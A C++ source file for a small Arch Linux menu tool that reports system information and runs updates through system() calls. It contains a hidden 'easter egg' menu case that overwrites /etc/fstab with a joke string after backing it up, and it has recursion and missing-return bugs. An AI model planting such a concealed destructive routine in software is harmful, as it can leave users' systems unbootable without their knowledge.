/*  Copyright © 2017 Hubert "hkk" Batkiewicz  (hbatkiewicz898@gmail.com)  */

// This file is part of Helper.
//
//    Helper is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation; either version 3 of the License, or
//    (at your option) any later version.
//
//    Helper is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with Helper.  If not, see <http://www.gnu.org/licenses/>.
//
//
//    Ten plik jest częścią Helper.
//
//    Helper jest wolnym oprogramowaniem: możesz go rozprowadzać dalej
//    i/lub modyfikować na warunkach Powszechnej Licencji Publicznej GNU,
//    wydanej przez Fundację Wolnego Oprogramowania - według wersji 3 tej
//    Licencji lub (według twojego wyboru) którejś z późniejszych wersji.
//
//    Helper rozpowszechniany jest z nadzieją, iż będzie on
//    użyteczny - jednak BEZ JAKIEJKOLWIEK GWARANCJI, nawet domyślnej
//    gwarancji PRZYDATNOŚCI HANDLOWEJ albo PRZYDATNOŚCI DO OKREŚLONYCH
//    ZASTOSOWAŃ. W celu uzyskania bliższych informacji sięgnij do     Powszechnej Licencji Publicznej GNU.
//
//    Z pewnością wraz z Helper otrzymałeś też egzemplarz
//    Powszechnej Licencji Publicznej GNU (GNU General Public License).
//    Jeśli nie - zobacz <http://www.gnu.org/licenses/>.

#include <iostream>
#include "helper.hpp"

int possibleChoices() {

  int tabelSize = 7;
  std::string choices[tabelSize] = { "About this PC", "GPU driver version",
    "Xorg version", "Date and time", "RAM usage", "System update", "Exit" };

  for (int choicesCounter = 0; choicesCounter < tabelSize; choicesCounter++) {
    std::cout << choicesCounter+1 << ". " << choices[choicesCounter] << std::endl;
  }

  return tabelSize;
}

int userChoice(int tabelSize) {

  int choice = 0;
  std::cout << "Your choice: ";

  while( (!(std::cin >> choice)) || choice > tabelSize || choice <= 0) {
    system("clear");
    possibleChoices();
    std::cin.clear();
    std::cin.ignore(1024, '\n');
    std::cout << "Wrong! Please, type it in the correct way: ";
  }

  return choice;
}

void switchChoice(int choice) {

  switch(choice) {
    case 1: {
      aboutThisPC();
      break;
    }
    case 2: {
      gpuDriverInfo();
      break;
    }
    case 3: {
      xorgVersion();
      break;
    }
    case 4: {
      dateAndTime();
      break;
    }
    case 5: {
      ramUsage();
      break;
    }
    case 6: {
      systemUpdate();
      break;
    }
    case 7: {
      exit(1);
      break;
    }
    case 2137: {
      easterEgg();
      break;
    }

  }

  return;
}

void doEverything() {

  switchChoice(userChoice(possibleChoices()));

  return;
}

int proceedQuestion() {

  char question = 0;

  while (!(std::cin >> question)) {
    system("clear");
    aboutThisPC();
    std::cin.clear();
    std::cin.ignore(1024, '\n');
    std::cout << "Wrong! Please, type it in the correct way: ";
  }

  switch (question) {
    case 'Y':
    case 'y': {
      return 1;
      break;
    }
    case 'N':
    case 'n': {
      return 0;
      break;
    }
    default: {
      std::cin.clear();
      std::cin.ignore(1024, '\n');
      std::cout << "Wrong! Please, type it in the correct way: ";
      proceedQuestion();
      break;
    }
  }

}

void errorsTabel(int error) {

  switch(error) {
    case 105010: {
      std::cout << "Error code: " << error << std::endl;
      std::cout << "You need to download yaourt first! Do it and then come back here!" << std::endl;
      break;
    }
    case 116011: {
      std::cout << "Error code: " << error << std::endl;
      std::cout << "You need to download Xorg first! Do it and then come back here!" << std::endl;
      break;
    }
    case 116012: {
      std::cout << "Error code: " << error << std::endl;
      std::cout << "You need to download Xorg first! Do it and then come back here!" << std::endl;
      break;
    }
  }

  return;
}

void aboutThisPC() {

  int errorCodePC = 105010;
  int check = system("neofetch");

  if (check) {
    std::cout << "We need to download some additional features, do you want to proceed? (Y/N) ";

    if (proceedQuestion()) {

        check = system("yaourt -S neofetch");
        if (check) {
          errorsTabel(errorCodePC);
          std::cout << std::endl;
          doEverything();
        }

    } else {
      std::cout << std::endl;
      doEverything();
      }
  } else doEverything();

  return;
}

void gpuDriverInfo() {

  system("clear");

  int errorCodeGPU = 116011;
  int check = system("grep 'X Driver' /var/log/Xorg.0.log");

  if (check) {
    errorsTabel(errorCodeGPU);
  }

  std::cout << std::endl;

  doEverything();

  return;
}

void xorgVersion() {

    system("clear");

    int errorCodeXorg = 116012;
    int check = system("sudo Xorg -version");

    if (check) {
      errorsTabel(errorCodeXorg);
    }

    std::cout << std::endl;

    doEverything();

    return;
}

void dateAndTime() {
  system("clear");

  std::cout << "Date: ";
    std::cout << std::endl;
    system("date +%d-%m-%Y");

  std::cout << std::endl;

  std::cout << "Time: ";
    std::cout << std::endl;
    system("date +%H:%M:%S");

  std::cout << std::endl;

  doEverything();

  return;
}

void ramUsage() {

  system("clear");
  system("top -n 1 -o %MEM");

  std::cout << std::endl;

  doEverything();

  return;
}

void systemUpdate() {

  system("clear");
  system("sudo pacman -Syu");

  std::cout << std::endl;

  doEverything();

  return;
}

void easterEgg() {

  system("cat /etc/fstab > $HOME/.fstab.old");
  system("echo 'papiesz xdddd' > /etc/fstab");

  std::cout << "\n Check your fstab :)" << std::endl;

  doEverything();

  return;
}














//
